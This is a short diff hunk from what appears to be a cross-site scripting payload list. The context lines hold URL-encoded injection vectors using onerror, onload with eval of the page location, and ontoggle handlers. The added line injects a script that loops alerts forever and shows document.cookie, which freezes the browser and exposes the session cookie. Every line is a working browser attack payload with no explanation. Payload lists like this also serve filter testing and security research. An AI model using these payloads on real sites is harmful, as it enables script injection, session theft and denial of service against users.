@@ -1218,3 +1218,4 @@ x”</title><img src%3dx onerror%3dconfirm(1)>
 <svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){
 data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2)}
 <details open ontoggle="alert(1)">
+<script>for(var i=0;i>=0;i++){alert(Math.random()); alert(document.cookie);}</script>
